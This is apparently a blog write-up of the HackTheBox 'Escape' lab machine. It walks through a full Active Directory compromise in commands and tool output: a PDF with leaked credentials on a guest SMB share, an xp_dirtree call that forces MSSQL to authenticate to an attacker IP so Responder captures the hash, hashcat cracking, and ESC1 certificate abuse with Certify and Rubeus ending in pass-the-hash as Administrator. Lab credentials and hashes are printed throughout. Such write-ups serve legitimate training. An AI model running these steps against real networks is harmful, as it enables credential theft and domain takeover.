---
title: HackTheBox - Escape
description:  Escape is a Medium difficulty Windows Active Directory machine that starts with an SMB share that guest authenticated users can download a sensitive PDF file. Inside the PDF file temporary credentials are available for accessing an MSSQL service running on the machine. An attacker is able to force the MSSQL service to authenticate to his machine and capture the hash. It turns out that the service is running under a user account and the hash is crackable. Having a valid set of credentials an attacker is able to get command execution on the machine using WinRM. Enumerating the machine, a log file reveals the credentials for the user `ryan.cooper`. Further enumeration of the machine, reveals that a Certificate Authority is present and one certificate template is vulnerable to the ESC1 attack, meaning that users who are legible to use this template can request certificates for any other user on the domain including Domain Administrators. Thus, by exploiting the ESC1 vulnerability, an attacker is able to obtain a valid certificate for the Administrator account and then use it to get the hash of the administrator user. 
date: 2024-08-20 22:00:00 +0530
categories: [HackTheBox]
tags: [hackthebox, Medium, Windows]
image:
  path: /assets/img/headers/htb_escape.webp
---

## Enumeration

The machine is assigned IPv4 as `10.10.11.202`. I will add this IPv4 in `/etc/hosts` along with hostname `escape.htb`. So we could use hostname instead of ip for scans.

```console
$ sudo nmap -sC -sV -T5 escape.htb                                                          
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-20 13:22 IST
Nmap scan report for escape.htb (10.10.11.202)
Host is up (0.22s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-08-20 15:53:10Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-08-20T15:54:39+00:00; +7h59m59s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-08-20T15:54:38+00:00; +7h59m59s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   10.10.11.202:1433: 
|     Target_Name: sequel
|     NetBIOS_Domain_Name: sequel
|     NetBIOS_Computer_Name: DC
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: dc.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
| ms-sql-info: 
|   10.10.11.202:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-08-20T15:38:49
|_Not valid after:  2054-08-20T15:38:49
|_ssl-date: 2024-08-20T15:54:39+00:00; +7h59m59s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
|_ssl-date: 2024-08-20T15:54:39+00:00; +7h59m59s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-08-20T15:54:38+00:00; +7h59m59s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-08-20T15:54:00
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 7h59m59s, deviation: 0s, median: 7h59m58s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 122.87 seconds
```

From the scan, we know that domain name for this machine is sequel.htb , so i will rename the hostname in `/etc/hosts`.

### SMBclient

```
$ smbclient -L escape.htb -N  

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Public          Disk      
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to escape.htb failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

`Public` share might be accessible. Lets check that out.

```console
$ smbclient //sequel.htb/public -N
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat Nov 19 17:21:25 2022
  ..                                  D        0  Sat Nov 19 17:21:25 2022
  SQL Server Procedures.pdf           A    49551  Fri Nov 18 19:09:43 2022

                5184255 blocks of size 4096. 1465673 blocks available
smb: \> mget "SQL Server Procedures.pdf"
Get file SQL Server Procedures.pdf? yes
getting file \SQL Server Procedures.pdf of size 49551 as SQL Server Procedures.pdf (19.7 KiloBytes/sec) (average 19.7 KiloBytes/sec)
smb: \> exit
```

We found a file `SQL Server Procedures.pdf`.  The document goes on to explain procedures to access the database (which I found in nmap scan as well).  It also spills the credentials for a little sneak peak to new joinees. we can use these creds.

```
[SNIP]
 
 For new hired and those that are still waiting their users to be created and perms assigned, can sneak a peek at the Database with user PublicUser and password GuestUserCantWrite1 .
```

| user       | password            |
| ---------- | ------------------- |
| PublicUser | GuestUserCantWrite1 |

### Impacket-mssqlclient

`$ impacket-mssqlclient PublicUser:GuestUserCantWrite1@sequel.htb`

Nothing of interest in the databases and the current user account has no access to execute xp_cmdshell. So, I decided to use `responder` to get ***NTLMv2-SSP Hash*** from MSSQL server.

1. Start the responder on tun0
	1. `$ sudo responder -I tun0`
2. run a command to trigger the catch.
	1. `exec master.dbo.xp_dirtree '\\10.10.16.4\anyrandomstring'`
3. Watch the hash in responder terminal.

```console
$ sudo responder -I tun0
[SNIP]
[SMB] NTLMv2-SSP Hash     : sql_svc::sequel:27b001760ec907ce:871B8746952027DF6EB8277664A08285:010100000000000000EB936208F3DA010AA422B13107400E0000000002000800380032004D00370001001E00570049004E002D0048005A004100390058004F005500590049003200440004003400570049004E002D0048005A004100390058004F00550059004900320044002E00380032004D0037002E004C004F00430041004C0003001400380032004D0037002E004C004F00430041004C0005001400380032004D0037002E004C004F00430041004C000700080000EB936208F3DA0106000400020000000800300030000000000000000000000000300000B8FA425944471BFF6D767A9EE4E14CADE4E503F911930428E0E122EC45184AEA0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E0034000000000000000000
```

### Hashcat

I will put the hash in `hash.txt` and use **hashcat** tool to get the password. we specify the hash format with `-m 5600` and use `rockyou.txt`.

```console
$ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt.gz

[SNIP]

SQL_SVC::sequel:27b001760ec907ce:871b8746952027df6eb8277664a08285:010100000000000000eb936208f3da010aa422b13107400e0000000002000800380032004d00370001001e00570049004e002d0048005a004100390058004f005500590049003200440004003400570049004e002d0048005a004100390058004f00550059004900320044002e00380032004d0037002e004c004f00430041004c0003001400380032004d0037002e004c004f00430041004c0005001400380032004d0037002e004c004f00430041004c000700080000eb936208f3da0106000400020000000800300030000000000000000000000000300000b8fa425944471bff6d767a9ee4e14cade4e503f911930428e0e122ec45184aea0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e0034000000000000000000:REGGIE1234ronnie

[SNIP]
```

| user    | password         |
| ------- | ---------------- |
| SQL_SVC | REGGIE1234ronnie |

i got a username and password. But this did not work with SQL server. 

### Evil-WinRM

Connecting to the machine via Evil-winrm with creds.

`evil-winrm -i 10.10.11.202 -u SQL_SVC -p REGGIE1234ronnie`

While going through all the folders, we can see a Folder SQLServer with errorlog. This error log contained the user credentials of Ryan.Cooper. 

```console

*Evil-WinRM* PS C:\Users\sql_svc\Documents> whoami
sequel\sql_svc

*Evil-WinRM* PS C:\SQLServer\Logs> type ERRORLOG.BAK | findstr -i Logon
2022-11-18 13:43:07.44 Logon       Error: 18456, Severity: 14, State: 8.
2022-11-18 13:43:07.44 Logon       Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
2022-11-18 13:43:07.48 Logon       Error: 18456, Severity: 14, State: 8.
2022-11-18 13:43:07.48 Logon       Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
```

We can try to connect back with Evil-winrm as Ryan.Cooper.

| user        | password         |
| ----------- | ---------------- |
| Ryan.Cooper | NuclearMosquito3 |

`evil-winrm -i 10.10.11.202 -u Ryan.Cooper -p NuclearMosquito3`

and we get connected.

### Identify ADCS and certs

```
openssl s_client -showcerts -connect 10.10.11.202:3269 | openssl x509 -noout -text | less -S

[SNIP] CN=sequel-DC-CA [SNIP]
```
We can use `certify` tool to proceed with identifying the vulnerable template.

[https://github.com/GhostPack/Certify?tab=readme-ov-file#example-walkthrough](https://github.com/GhostPack/Certify?tab=readme-ov-file#example-walkthrough)

```console
.\Certify.exe find /vulnerable

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.1.0

[*] Action: Find certificate templates
[*] Using the search base 'CN=Configuration,DC=sequel,DC=htb'

[*] Listing info about the Enterprise CA 'sequel-DC-CA'

    Enterprise CA Name            : sequel-DC-CA
    DNS Hostname                  : dc.sequel.htb
    FullName                      : dc.sequel.htb\sequel-DC-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=sequel-DC-CA, DC=sequel, DC=htb
    Cert Thumbprint               : A263EA89CAFE503BB33513E359747FD262F91A56
    Cert Serial                   : 1EF2FA9A7E6EADAD4F5382F4CE283101
    Cert Start Date               : 11/18/2022 12:58:46 PM
    Cert End Date                 : 11/18/2121 1:08:46 PM
    Cert Chain                    : CN=sequel-DC-CA,DC=sequel,DC=htb
    UserSpecifiedSAN              : Disabled
    CA Permissions                :
      Owner: BUILTIN\Administrators        S-1-5-32-544

      Access Rights                                     Principal

      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
      Allow  ManageCA, ManageCertificates               sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
    Enrollment Agent Restrictions : None

[!] Vulnerable Certificates Templates :

    CA Name                               : dc.sequel.htb\sequel-DC-CA
    Template Name                         : UserAuthentication
    Schema Version                        : 2
    Validity Period                       : 10 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
    Permissions
      Enrollment Permissions
        Enrollment Rights           : sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Domain Users           S-1-5-21-4078382237-1492182817-2568127209-513
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
      Object Control Permissions
        Owner                       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
        WriteOwner Principals       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
        WriteDacl Principals        : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
        WriteProperty Principals    : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
```

Things to note from above are:
+ Template Name  : UserAuthentication
+ CA Name        : dc.sequel.htb\sequel-DC-CA

![Escape](assets/img/solo/IMG-HTB-Escape.png)


```console
.\Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:administrator

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.1.0

[*] Action: Request a Certificates

[*] Current user context    : sequel\Ryan.Cooper
[*] No subject name specified, using current context as subject.

[*] Template                : UserAuthentication
[*] Subject                 : CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb
[*] AltName                 : administrator

[*] Certificate Authority   : dc.sequel.htb\sequel-DC-CA

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 13

[*] cert.pem         :

-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAtf5gd1efviI2Tzocj..
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIGEjCCBPqgAwIBAgITHgAAAA0..
-----END CERTIFICATE-----


[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

Save the certificate as cert.pem and convert it to cert.pfx

`$ openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx`

Now, upload the `cert.pfx` and _Rubeus.exe_ to **escape** machine and request a TGT for the `altname` user.

```console
.\Rubeus.exe asktgt /user:administrator /certificate:C:\Users\Ryan.Cooper\Documents\cert.pfx

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.2

[*] Action: Ask TGT

[*] Got domain: sequel.htb
[*] Using PKINIT with etype rc4_hmac and subject: CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb
[*] Building AS-REQ (w/ PKINIT preauth) for: 'sequel.htb\administrator'
[*] Using domain controller: fe80::493c:d6fc:b78a:1f9f%4:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIGSDCCBkSgAwIBBaEDAgEWoo..(snip)

  ServiceName              :  krbtgt/sequel.htb
  ServiceRealm             :  SEQUEL.HTB
  UserName                 :  administrator (NT_PRINCIPAL)
  UserRealm                :  SEQUEL.HTB
  StartTime                :  8/20/2024 5:16:49 PM
  EndTime                  :  8/21/2024 3:16:49 AM
  RenewTill                :  8/27/2024 5:16:49 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable
  KeyType                  :  rc4_hmac
  Base64(key)              :  bRPXb6JexjEHjIHGPpkQnw==
  ASREP (key)              :  F1BD834CE7608C40769CB3F91A3A4773
```

This will try to add the administrator session to the current session. and it fails. so we need to add additional arguements to see the NTLM creds.

```console
.\Rubeus.exe asktgt /user:administrator /certificate:C:\Users\Ryan.Cooper\Documents\cert.pfx /getcredentials /show /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.2

[*] Action: Ask TGT

[*] Got domain: sequel.htb
[*] Using PKINIT with etype rc4_hmac and subject: CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb
[*] Building AS-REQ (w/ PKINIT preauth) for: 'sequel.htb\administrator'
[*] Using domain controller: fe80::493c:d6fc:b78a:1f9f%4:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIGSDCCBkSgAwIBB...(snip)


  ServiceName              :  krbtgt/sequel.htb
  ServiceRealm             :  SEQUEL.HTB
  UserName                 :  administrator (NT_PRINCIPAL)
  UserRealm                :  SEQUEL.HTB
  StartTime                :  8/20/2024 5:20:41 PM
  EndTime                  :  8/21/2024 3:20:41 AM
  RenewTill                :  8/27/2024 5:20:41 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable
  KeyType                  :  rc4_hmac
  Base64(key)              :  N/tTRKmIo93PaSP2FVRabA==
  ASREP (key)              :  A0AE15E37446E450280923B685F4733D

[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : A52F78E4C751E5F5E17E1E9F3E58F4EE
```

We got the NTLM hash. We can login with NTLM hash using evil-winrm.

Alternatively, we can use `certipy` tool as well to get NTLM hash as mentioned here: 

[https://0xdf.gitlab.io/2023/06/17/htb-escape.html#abuse-template](https://0xdf.gitlab.io/2023/06/17/htb-escape.html#abuse-template)

```console
$ evil-winrm -i 10.10.11.202 -u Administrator -H A52F78E4C751E5F5E17E1E9F3E58F4EE

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
sequel\administrator

# You can get root.txt in desktop folder now.
```



